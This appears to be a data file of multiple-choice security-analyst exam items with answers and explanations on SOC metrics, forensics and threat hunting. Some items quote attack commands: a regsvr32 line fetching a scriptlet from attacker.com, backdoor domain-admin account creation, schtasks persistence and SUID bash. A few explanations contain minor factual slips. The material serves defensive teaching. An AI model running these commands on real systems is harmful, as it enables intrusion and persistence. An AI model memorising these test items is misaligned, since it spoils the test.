{q:"Which element of a security operations report would MOST help justify increasing the SOC team's headcount?",o:["Number of coffee breaks taken", "Alert volume vs. analyst capacity analysis — showing that current alert volumes require X analyst-hours per day while current staffing provides Y analyst-hours, with the gap demonstrating that analysts cannot adequately triage all alerts in a timely manner", "Number of tools deployed", "List of vendor contracts"],a:1,d:4,e:"Resource justification requires quantitative capacity analysis: (1) average time to triage one alert (15 minutes), (2) daily alert volume (500 alerts), (3) required analyst-hours (500 × 15 min = 125 hours/day), (4) current analyst capacity (3 analysts × 8 hours = 24 hours/day). The 125 vs. 24 hour gap demonstrates either: 80% of alerts go unreviewed, or analysts are working unsustainably. This data-driven argument is far more compelling to leadership than 'we're overwhelmed.'"},
{q:"A security analyst must explain the difference between a vulnerability, a threat, and a risk to a non-technical audience. The CLEAREST explanation is:",o:["These terms are interchangeable", "Vulnerability = weakness (unlocked door), Threat = potential attacker (burglar in the neighborhood), Risk = the combination: probability of the burglar trying the unlocked door × impact if they succeed. Fixing the vulnerability (lock the door) reduces risk even if the threat remains", "Risk = threat only", "Vulnerability = risk"],a:1,d:4,e:"Vulnerability, threat, risk framework: Vulnerability (a weakness that can be exploited) + Threat (an actor or event that might exploit it) + Impact (consequences if exploited) = Risk. Examples: vulnerability = unpatched SQL injection; threat = cybercriminal group targeting e-commerce; risk = 60% likelihood of exploitation × $2M potential breach cost = $1.2M expected annual loss. Risk drives prioritization; fixing high-impact, high-likelihood vulnerabilities reduces risk most efficiently."},
{q:"Which communication practice should a security analyst AVOID when presenting findings to a non-technical stakeholder?",o:["Using business impact language", "Leading with acronyms and technical jargon without explanation — terms like CVSS, XSS, SSRF, or RCE are meaningless to non-technical stakeholders and prevent effective decision-making", "Summarizing the key findings", "Providing specific recommendations"],a:1,d:4,e:"Technical communication anti-patterns for non-technical audiences: (1) unexplained acronyms (CVSS, EPSS, APT, C2), (2) technical severity without business translation (CVSS 9.8 vs. 'an attacker can steal all customer data without any password'), (3) focusing on vulnerabilities rather than business risk, (4) presenting raw data without interpretation, (5) using vendor marketing language. The test: could the Chief Revenue Officer make a decision based on this report? If not, translate it."},
{q:"After a major security breach, an organization's legal team restricts what the security team can include in written communications about the incident. The purpose of this restriction is most likely:",o:["Hiding information from regulators", "Protecting potentially privileged information and preventing premature disclosures that could create legal liability — privileged attorney-client communications are protected from discovery in litigation, while written communications outside privilege are discoverable", "Covering up the breach", "Saving time"],a:1,d:4,e:"Attorney-client privilege: communications made for the purpose of obtaining legal advice, with an attorney, are privileged — protected from discovery in litigation. Legal teams often establish incident response communications under attorney supervision to maintain this privilege for internal investigation findings. This doesn't hide information from regulators (regulatory disclosure is separate) but protects internal investigation details from plaintiff attorneys in civil litigation. Security analysts should understand: legal hold ≠ coverup = legitimate litigation protection."},
{q:"An analyst is presenting the results of a red team exercise to the board. The red team achieved full domain compromise in 3 hours. The MOST appropriate framing is:",o:["The security team failed completely", "This represents the current security capability gap and requires investment in specific controls (MFA on all admin accounts, endpoint monitoring, network segmentation) that would have prevented the red team's attack path — with estimated costs and timelines for each improvement", "The red team cheated", "This is a devastating failure requiring immediate executive personnel changes"],a:1,d:4,e:"Red team results framing: (1) outcome (domain compromise in 3 hours) + (2) specific attack path used (VPN credential spray → lateral movement via PtH → DA escalation via Kerberoasting) + (3) specific controls that would have prevented each step (phishing-resistant MFA, EDR with PtH detection, AES-only Kerberos, MSAs for service accounts) + (4) estimated cost and timeline for each control. This converts a 'failure' into an actionable improvement roadmap with board-level investment decisions."},
{q:"Which security metric indicates the average number of days a critical vulnerability exists in the environment before it is remediated?",o:["Vulnerability discovery rate", "Mean Time to Remediate (MTTR) for critical vulnerabilities — measuring the average days from vulnerability discovery/disclosure to confirmed remediation. This is the most direct measure of patching program effectiveness for the highest-risk findings", "Total vulnerability count", "Number of scanning tools deployed"],a:1,d:4,e:"Critical MTTR is the single most important vulnerability management program metric. Industry benchmarks: CISA/NIST guidance for critical vulnerabilities on internet-facing systems = 15-30 days. Many organizations have MTTR of 60-90+ days for criticals. Tracking MTTR trend shows: is the program improving (decreasing MTTR)? Are certain asset types consistently slow? Are certain business units responsible for delays? This metric is meaningful to both security practitioners and executives — it answers 'are we getting better at reducing our risk?'"},
{q:"An organization's security team discovers a breach but the leadership team decides not to publicly disclose it to avoid reputational damage. A security analyst on the team has concerns. What is the appropriate action?",o:["Comply with leadership's decision", "Escalate concerns through internal channels (legal, compliance, audit committee, or board) — publicly-traded companies may have disclosure obligations under SEC rules; notification laws may require disclosing breaches affecting individuals' PII. Non-disclosure may create larger legal liability than disclosure", "Immediately post about it on social media", "Ignore the concern"],a:1,d:4,e:"Breach disclosure obligations are legal requirements, not optional. SEC Regulation S-K requires material cybersecurity incident disclosure within 4 business days for public companies. State breach notification laws require individual notification for PII breaches. Choosing not to disclose a legally required breach creates: (1) regulatory fines, (2) criminal liability for intentional concealment, (3) significantly greater civil liability when discovered. The analyst's concern is valid — escalate to the audit committee or legal counsel. If both refuse to address clear legal obligations, the analyst should consider whistleblower protections."},
{q:"Which element makes an incident timeline in a post-incident report MOST credible and useful?",o:["Internal team's recollection only", "Cross-referenced timestamps from multiple independent log sources — firewall, endpoint, authentication, and network logs all confirming the same sequence of events, with noted time synchronization status for each source", "Only the SIEM timestamps", "Only verbal accounts from IR team members"],a:1,d:4,e:"Timeline credibility: a single log source could be tampered, misconfigured, or incorrect. Cross-referencing multiple independent sources (firewall shows connection at 10:01:23, endpoint EDR shows process spawn at 10:01:25, AD auth log shows authentication at 10:01:22) creates a corroborated timeline. Note: document NTP synchronization status for each source — a 30-second skew changes apparent event ordering. For legal proceedings, cross-referenced multi-source timelines are far more defensible than any single source."},
{q:"Which communication element should be included in ALL security advisories sent to non-technical employees about current threats?",o:["CVE numbers and technical exploitation details", "Specific observable indicators of the threat AND concrete actions employees should take — 'If you receive an email with these characteristics: report it using this button' rather than 'phishing is a threat' without actionable guidance", "A full threat actor profile", "Patch deployment instructions"],a:1,d:4,e:"Effective security awareness communications: (1) specific threat indicators employees can recognize (what does this phishing email look like? what does the fake login page look like?), (2) concrete action steps (do this, don't do that, report using this specific mechanism), (3) consequences of failure (brief, non-fear-mongering but real), (4) reward for correct behavior (reinforce positive actions). Vague warnings ('be careful of phishing') produce no behavioral change. Specific, actionable guidance produces reporting behavior changes that create defense value."},
{q:"A security analyst notices that their organization's vulnerability management reports consistently list 'patch applied' as the remediation for all findings. An internal audit finds that 30% of 'patched' findings are still vulnerable when rescanned. The root cause is MOST likely:",o:["The scanner has bugs", "Insufficient verification process — findings are being marked 'patched' based on IT team self-reporting without independent verification rescans. The vulnerability management workflow must include mandatory rescan and technical confirmation before closing any critical or high finding", "The vulnerabilities are not patchable", "The scanner is too sensitive"],a:1,d:4,e:"Verification gap: allowing system owners to self-report remediation without independent verification is a process failure. The 30% false-closure rate means: (1) one-third of 'closed' critical vulnerabilities are still open, (2) the risk dashboard is artificially deflated, (3) leadership believes risk is lower than it actually is. Required fix: mandatory rescan by the security team (not IT) before closing any critical or high finding. The rescan must show the vulnerability no longer present — not just a ticket saying it was patched."},
{q:"Which Windows registry key stores a list of recently opened files that can reveal what documents an attacker or insider accessed?",o:["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs — records recently accessed files by file type, providing forensic evidence of document access", "HKLM\\SYSTEM\\CurrentControlSet\\Services", "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs"],a:1,d:1,e:"RecentDocs records files opened through Windows Explorer/shell operations — the last files opened, organized by file extension. Forensically valuable for: insider threat investigations (did this user access the financial data they're accused of taking?), attacker reconnaissance (what did the attacker look at after compromise?), and user activity timeline reconstruction. Sysinternals Autoruns and RegRipper parse this automatically. Note: this reflects shell operations, not all file access — Event ID 4663 covers all file access."},
{q:"An alert fires: 'Unusual process 'schtasks.exe /create /tn WindowsUpdate /tr C:\\Temp\\update.exe /sc onstart /ru SYSTEM /f'. What persistence mechanism is being established?",o:["Legitimate Windows Update scheduling", "Attacker creating a scheduled task named 'WindowsUpdate' (masquerading as legitimate) that runs 'update.exe' from C:\\Temp at system startup with SYSTEM privileges — a textbook masquerading + scheduled task persistence combination", "IT automation task", "Software deployment"],a:1,d:1,e:"schtasks.exe /create establishes persistence. Red flags: (1) /tn 'WindowsUpdate' — masquerading as Microsoft task, (2) /tr C:\\Temp\\update.exe — execution from a user-writable temp directory (not a legitimate Windows path), (3) /sc onstart — runs at every system startup, (4) /ru SYSTEM — elevated SYSTEM privileges, (5) /f — forces creation without prompting. This is ATT&CK T1053.005 (Scheduled Task) combined with T1036 (Masquerading). Detection: Event ID 4698 (task created) with command line analysis."},
{q:"A threat hunter reviews process creation logs and finds 'regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll'. What technique is this?",o:["Legitimate COM object registration", "Squiblydoo/Regsvr32 COM scriptlet execution — regsvr32 with /i: parameter loads a remote scriptlet, enabling remote code execution while bypassing AppLocker (regsvr32 is trusted) and leaving no traces in typical Script Block Logging", "Windows DLL registration", "Software installation"],a:1,d:1,e:"Regsvr32 (T1218.010) abuses the legitimate COM registration tool to execute arbitrary code from a remote URL. The /i: parameter specifies a script file (SCT/XML) that can contain JScript or VBScript. Benefits for attackers: regsvr32 is a signed Microsoft binary (AppLocker bypass), can execute over HTTP/HTTPS, and doesn't write the payload to disk. Detection: regsvr32 with /i: parameter containing a URL, network connections from regsvr32.exe, Sysmon network connection events from regsvr32."},
{q:"Which artifact is MOST useful for determining which websites a user visited using Google Chrome on a Windows system?",o:["Windows event logs", "Chrome's SQLite database at '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History' — contains URLs, visit timestamps, visit counts, and page titles", "DNS cache (ipconfig /displaydns)", "Firewall logs"],a:1,d:1,e:"Chrome stores browsing history in a SQLite database. Forensic tools (DB Browser for SQLite, Autopsy, Magnet Axiom) parse this to extract: URL visited, visit timestamp, visit count, page title, and typed URL indicator (did the user manually type this URL or follow a link?). This is direct evidence of specific web activity. DNS cache shows recently resolved domains but not specific pages; proxy logs show network-level activity but may miss HTTPS content details."},
{q:"An analyst investigating a Linux system finds '/bin/bash' has a SUID bit set (chmod 4755). This is highly suspicious because:",o:["SUID on bash is a performance optimization", "SUID on bash is a critical privilege escalation vulnerability — any user can run 'bash -p' to get a SUID shell with root privileges. This is a classic backdoor left by attackers or a misconfiguration that should never exist in a production environment", "SUID is required for bash to function", "SUID means the file is encrypted"],a:1,d:1,e:"SUID (Set User ID) on an executable means it runs with the file owner's permissions (not the executing user's). SUID on /bin/bash owned by root = any user can execute 'bash -p' and get an interactive root shell. This is either: (1) intentional backdoor left by an attacker after compromise, (2) critical system misconfiguration. Immediate response: remove SUID ('chmod -s /bin/bash'), investigate how it was set (who and when), verify system integrity. Always check SUID binaries during IR: 'find / -perm -4000 -type f 2\x3E/dev/null'."},
{q:"A security analyst sees a network connection from 'winlogon.exe' to an external IP address. Why is this suspicious?",o:["winlogon.exe commonly makes external connections", "Legitimate winlogon.exe handles local Windows logon operations and should never make external network connections. An external connection from winlogon.exe indicates process hollowing or injection into this trusted process", "winlogon.exe needs internet access for authentication", "This is normal for Windows Update"],a:1,d:1,e:"winlogon.exe handles local logon/logoff and credential operations — it has no legitimate reason for external network connections. External connections from winlogon.exe indicate: code injection into the winlogon process (T1055) by malware that chose this high-privilege, always-running process as a host. This is a high-confidence indicator of advanced compromise. Sysmon Event ID 3 (network connection) filtered for critical Windows processes (winlogon, lsass, csrss, smss) making outbound connections is a high-fidelity hunt query."},
{q:"During threat hunting, an analyst discovers 'msbuild.exe' executed a project file from a temp directory: 'msbuild.exe C:\\Temp\\payload.proj'. Why is this significant?",o:["MSBuild compiles code legitimately", "MSBuild (T1127.001) is a LOLBIN that can compile and execute C# or VB.NET code from a project file — attackers use it to execute code in memory without dropping standard executable files, bypassing AppLocker restrictions that target .exe files", "This is normal software development activity", "MSBuild.exe is a virus scanner"],a:1,d:1,e:"MSBuild.exe (Microsoft Build Engine) executes build scripts that can contain inline tasks with arbitrary C#/VBScript code. Attackers craft malicious .proj files that execute shellcode or download payloads — MSBuild compiles and runs them in memory. AppLocker typically whitelists MSBuild. Running MSBuild from temp directories with unusual project files (not legitimate build directories) is suspicious. Hunt: MSBuild.exe with project files in temp/user directories, MSBuild network connections (it shouldn't need the internet)."},
{q:"A SIEM correlation rule fires: 'Same account: failed login × 5 in 60s, then successful login, then NEW scheduled task created within 10 minutes.' What attack lifecycle does this represent?",o:["Normal user workflow", "Initial Access (brute force) → Execution/Persistence (scheduled task creation) — the rule correlates three phases of attack progression in sequence, providing a higher-fidelity alert than any individual event", "Password reset workflow", "Software installation"],a:1,d:1,e:"Correlated multi-phase alert: (1) 5 failed logins in 60s = brute force attempt, (2) successful login = access achieved, (3) scheduled task creation = immediate persistence establishment. This three-event chain in sequence with a named account is extremely high-fidelity — each event alone generates noise, but the sequence together describes a complete attack chain from credential attack to persistence. This is detection engineering best practice: correlate across attack phases for precision."},
{q:"Which OSINT source would BEST help a threat analyst determine what services and ports an organization exposes to the internet WITHOUT actively scanning the organization's systems?",o:["Google search", "Shodan or Censys — passive internet-wide scanning databases that index publicly exposed services, certificates, banners, and open ports without requiring direct scanning of the target organization", "WHOIS registry only", "LinkedIn"],a:1,d:1,e:"Shodan/Censys continuously scan the internet and maintain searchable databases of exposed services, open ports, service banners, TLS certificates, and device information. An analyst can query these databases to understand an organization's external attack surface without any active scanning. This is also what attackers do for reconnaissance. Defenders use Shodan to: discover forgotten/unauthorized internet-exposed assets, find exposed management interfaces, identify certificate/TLS configurations, and see what attackers see before they attack."},
{q:"An analyst reviewing Sysmon logs finds Event ID 3 (network connection) where the image is 'rundll32.exe' connecting to an external IP on port 443. This is significant because:",o:["rundll32.exe commonly makes HTTPS connections", "rundll32.exe (runs DLL files) should not be making direct internet connections — this indicates a malicious DLL loaded by rundll32 is communicating with C2 infrastructure, a common LOTL evasion technique", "rundll32.exe is an antivirus component", "Port 443 is safe for any process"],a:1,d:1,e:"rundll32.exe is a legitimate tool for loading and executing DLL functions — it has no business making external internet connections. External connections from rundll32 indicate: a malicious DLL loaded via rundll32 using the tool as a host (LOTL evasion — the network connection appears to come from a signed Microsoft binary). Detection: Sysmon Event ID 3 with Image = rundll32.exe + any external IP is a high-fidelity alert. The DLL command line in Event ID 1 reveals which DLL is responsible."},
{q:"A security team implements a 'canary file' — a uniquely named file placed in a sensitive directory. An alert fires when the file is accessed. What does this detection technique represent?",o:["Anti-forensics", "Deception-based detection — canary files (like network honeypots) generate high-fidelity alerts with near-zero false positives because no legitimate user has a reason to access a file they don't know exists", "Data loss prevention", "Access control enforcement"],a:1,d:1,e:"Canary files (honey files) are deception technology: they're never accessed in normal operations, so any access = suspicious. High-fidelity alert characteristics: (1) zero false positives from legitimate users (they don't know the file exists), (2) immediate detection of suspicious reconnaissance or exfiltration attempts, (3) can be distributed across all sensitive directories for broad coverage. Canary tokens (canarytokens.org provides free implementations) can also embed unique identifiers in Office documents that beacon home when opened, even after exfiltration."},
{q:"Which Windows command would an attacker use to discover all running processes and their associated executable paths on a compromised system?",o:["dir C:\\Windows", "tasklist /v /fo list — lists all running processes with verbose details including executable paths, PID, memory usage, and window titles, providing comprehensive process enumeration for lateral movement planning", "netstat -an", "ipconfig /all"],a:1,d:1,e:"tasklist /v (T1057 - Process Discovery) provides comprehensive process information attackers use for: (1) identifying running security software (EDR, AV) to evade, (2) finding processes to inject into, (3) confirming their malware is running, (4) discovering interesting processes to target (password managers, browsers with saved credentials). Combined with 'wmic process get name,executablepath,processid,commandline' for even more detail. Detection: tasklist.exe execution from unexpected parent processes or accounts."},
{q:"An analyst examining a compromised system finds evidence of 'timestomping' — the malware modified its file creation and modification timestamps to match a system file. What is the forensic implication?",o:["Timestamps are now reliable", "Filesystem timestamps are no longer reliable for timeline reconstruction — the analyst must use additional evidence sources (USN journal, Windows event logs, prefetch, AmCache) to establish actual execution times rather than relying on file metadata", "The file is not malware", "File timestamps are always accurate"],a:1,d:1,e:"Timestomping (T1070.006) modifies NTFS file timestamps ($STANDARD_INFORMATION attribute) to mislead forensic analysis. Defenders: (1) NTFS $FILENAME attribute is harder to modify and often retains original timestamps — compare $STANDARD_INFORMATION vs $FILENAME timestamps (discrepancy indicates timestomping), (2) USN journal ($UsnJrnl) contains a separate record of file operations, (3) Windows event logs have their own timestamps, (4) AmCache, Shimcache, and Prefetch record execution with their own timestamps. Multiple corroborating time sources defeat timestomping."},
{q:"A SIEM alert fires for 'Access to sensitive HR share by account: IT-SVC-01'. The account is a service account for IT asset management software. This is suspicious because:",o:["Service accounts can access any share", "IT asset management service accounts have no legitimate business reason to access HR data — this indicates either credential theft and reuse, a compromised service account, or misconfigured service account permissions that should be remediated", "HR shares are accessible to all IT accounts", "Service accounts have default access to all shares"],a:1,d:1,e:"Service account privilege creep: service accounts often receive excessive permissions during initial configuration and never have them reviewed. An IT asset management service account accessing HR data is either: (1) attacker using stolen service account credentials to access sensitive data (lateral movement + data access), (2) misconfigured permissions (the service account CAN access HR but SHOULD NOT). Both require investigation and remediation. Service accounts should follow least privilege: only the specific shares/systems the service needs for its function."},
{q:"During log analysis, an analyst finds that a Windows Security log was only 512KB in size despite running for 30 days, while the maximum size is 128MB. What does this indicate?",o:["Normal log management", "Possible log tampering or very low audit logging configuration — a nearly full audit-logging system should fill logs much faster than 30 days for 512KB. Either audit logging is misconfigured (capturing almost nothing) or logs were cleared/wrapped frequently", "Efficient logging", "The system is new"],a:1,d:1,e:"A 512KB log over 30 days on a production system indicates one of: (1) audit logging is not configured (only default events logged — very few), (2) logs were regularly cleared to hide attacker activity (check for Event ID 1102), (3) log wrap is occurring (oldest events overwritten without being collected). Production systems with proper audit policies generate megabytes of logs daily. Inadequate logging = inadequate detection capability. Verify audit policy with 'auditpol /get /category:*' and compare against baseline."},
{q:"Which threat intelligence platform capability enables automated sharing of indicators across multiple organizations in an Information Sharing and Analysis Center (ISAC)?",o:["Email distribution lists", "TAXII server infrastructure with structured STIX feeds — enabling automated, machine-readable indicator sharing between member organizations in real-time rather than manual email-based sharing", "Shared spreadsheets", "Web portal with manual downloads"],a:1,d:1,e:"ISACs (Financial Services ISAC, Healthcare ISAC, etc.) enable sector-specific threat intelligence sharing. Modern ISACs use TAXII/STIX for automated indicator distribution: a financial sector ISAC member who detects a new banking trojan C2 domain can automatically share that indicator to all member organizations within minutes via TAXII feeds. Member security tools (SIEMs, firewalls, EDR) automatically consume TAXII feeds and implement blocking/detection. This is the architecture behind automated threat intelligence sharing."},
{q:"An analyst detects that a host is running 'mimikatz.exe' directly. This is unusual compared to typical Mimikatz usage. What does this indicate about the threat actor?",o:["Sophisticated attacker using advanced tools", "Less sophisticated attacker — advanced threat actors use memory-only Mimikatz (Invoke-Mimikatz, Cobalt Strike's hashdump, or reflective loading) that doesn't write to disk. Running mimikatz.exe directly creates obvious file artifacts and AV alerts, suggesting a less sophisticated actor or a penetration tester", "Normal security testing", "Mimikatz is an antivirus tool"],a:1,d:1,e:"Threat actor sophistication assessment from tool usage: running signed/unsigned mimikatz.exe directly creates: an obvious file on disk (hash detection), AV/EDR behavioral alerts (well-known tool), and a clear process creation log. Sophisticated APTs and ransomware groups use: reflective DLL loading (no disk file), PowerShell implementations (Invoke-Mimikatz), or built-in capabilities of C2 frameworks. The direct execution of mimikatz.exe often indicates: penetration tester, less sophisticated cybercriminal, or script kiddie. This context affects IR response priority and escalation."},
{q:"A threat hunt hypothesis states: 'An attacker may have used RDP to move laterally to servers after 5 PM when IT staff are not present.' Which data sources test this hypothesis?",o:["AV scan logs", "Windows Security Event 4624 Logon Type 10 (RemoteInteractive/RDP) on servers filtered for times after 5 PM, combined with source workstation information from the same event — comparing to a baseline of authorized after-hours RDP sessions", "DNS query logs only", "Network flow data only"],a:1,d:1,e:"Testing specific time-based hypotheses: Event ID 4624 with Logon Type 10 (RDP) on servers, filtered by time (after 5 PM), shows which accounts used RDP after hours to which servers. Baseline comparison: are any of these accounts/source systems unusual for after-hours RDP? authorized IT admins might use RDP after hours, but finance user accounts or IT service accounts should not be initiating RDP to domain controllers at 11 PM. Combining time, account type, source, and destination creates a precise test for this hypothesis."},
{q:"Which tool provides passive DNS replication data — historical records of which IP addresses a domain resolved to over time?",o:["Active DNS scanning", "Passive DNS databases (e.g., RiskIQ, Farsight DNSDB, VirusTotal passive DNS) — recording historical DNS resolutions collected from recursive resolvers without actively querying target domains, enabling pivot analysis and infrastructure tracking", "WHOIS lookup only", "Nmap DNS scanning"],a:1,d:1,e:"Passive DNS collects DNS responses observed by partner recursive resolvers and stores them historically. This enables: (1) 'what IP did this C2 domain resolve to 6 months ago?' (pivot to infrastructure), (2) 'what domains have resolved to this attacker IP?' (find related infrastructure), (3) 'when did this domain start resolving to this IP?' (campaign start date), (4) 'what other domains share this IP?' (cluster related threat actor infrastructure). Essential for threat intelligence and campaign attribution analysis."},
{q:"An analyst finds the following in Windows event logs: Event 4624 (logon success), EventID 4688 cmd.exe, EventID 4688 whoami, EventID 4688 net user /add backdoor P@ss /domain, EventID 4688 net group 'Domain Admins' backdoor /add. What is the COMPLETE attack sequence?",o:["User creating a maintenance account", "Attacker sequence: authenticated access (4624) → got command shell (cmd.exe) → discovered identity (whoami) → created backdoor domain account (net user /add /domain) → escalated to Domain Admin (net group 'Domain Admins' /add) — complete from access to domain persistence in four commands", "IT administrative task", "Software installation procedure"],a:1,d:1,e:"This is a complete post-compromise attack chain readable directly from event logs: 1) 4624 = attacker authenticated (with compromised credentials), 2) cmd.exe = command shell access, 3) whoami = confirming running identity, 4) net user /add /domain = creating persistent backdoor account in Active Directory, 5) net group Domain Admins /add = immediately escalating the new account to Domain Admin. This entire chain should generate multiple alerts and be caught before step 5. Detection: each step has specific Event IDs that, when correlated, definitively identify the attack."},
{q:"A developer submits a pull request and the CI/CD pipeline runs automated security checks. The SAST scan finds a potential path traversal vulnerability in file upload handling. The correct action is:",o:["Merge the code and fix later", "Block the merge until the path traversal is remediated — blocking vulnerable code before it enters the codebase (shift-left) is far cheaper than fixing it post-deployment, and the CI/CD gate ensures security is part of the development workflow", "Override the scan result — SAST has false positives", "Deploy to staging only with the vulnerability present"],a:1,d:2,e:"CI/CD security gates (sometimes called 'security guardrails') prevent vulnerable code from progressing through the pipeline. This is the shift-left principle in action: a path traversal finding at code commit costs minutes to fix (developer is in context, change is small). The same finding post-deployment requires change management, deployment downtime, testing, and potentially customer impact if exploited. The developer experience of seeing security feedback immediately in their workflow is the most efficient security integration model."},
{q:"An organization's cloud provider sends a notification: 'Your S3 bucket examplebucket-backup has been publicly accessible for 72 hours.' Before taking any action, what should the analyst determine FIRST?",o:["Nothing — immediately restrict access", "What data is in the bucket and whether any unauthorized access occurred (CloudTrail logs) — this determines: whether a breach notification is required, what data was potentially exposed, and whether affected parties need notification. The restriction should happen simultaneously but the data classification drives the response scope", "Ignore — accidental exposures don't constitute breaches", "Immediately delete the bucket"],a:1,d:2,e:"Both actions must happen simultaneously but in priority order: (1) RESTRICT ACCESS immediately (stop ongoing exposure), (2) ASSESS DATA CONTENT and access logs (determine breach scope). CloudTrail S3 data events show exactly which objects were accessed, from which IPs, and when. If PII/PHI/payment data was accessed by unauthorized parties, breach notification obligations apply. If the bucket contained only non-sensitive data or shows no external access in logs, notification may not be required. The data classification and access log review determines response scope."},
{q:"Which tool would an analyst use to determine if a mobile application (APK) contains known vulnerable third-party libraries?",o:["Network traffic scanner", "MobSF (Mobile Security Framework) or OWASP Dependency Check — analyzing the APK's bundled libraries against vulnerability databases, similar to SCA for traditional applications", "Port scanner", "Web application proxy"],a:1,d:2,e:"Mobile applications bundle all their dependencies in the APK/IPA file. MobSF (open source) performs: static analysis of decompiled code, dependency scanning for known vulnerable libraries, permission analysis, certificate validation, hardcoded credential detection, and API endpoint discovery. This is mobile SCA (Software Composition Analysis). As mobile apps bundle library versions at build time, they're often slow to update vulnerable dependencies — library analysis finds risks not visible from external testing."},
{q:"A penetration test finds that a login page doesn't implement account lockout after failed attempts. The CVSS Attack Complexity metric for this finding would be:",o:["High — requires sophisticated technique", "Low — no special conditions are required to attempt unlimited password guesses against the login page", "Not applicable — this is a configuration finding only", "Medium — requires network access"],a:1,d:2,e:"Account lockout absence means an attacker can attempt unlimited password guesses without triggering a lockout — Attack Complexity = Low (no special conditions needed beyond network access). The vulnerability allows unrestricted brute force, making it a higher severity finding than if complexity were high. This is a configuration/design vulnerability — remediation is implementing lockout policy (e.g., 5 failed attempts = 30-minute lockout) combined with MFA. CySA+ tests ability to apply CVSS metrics correctly to real-world findings."},
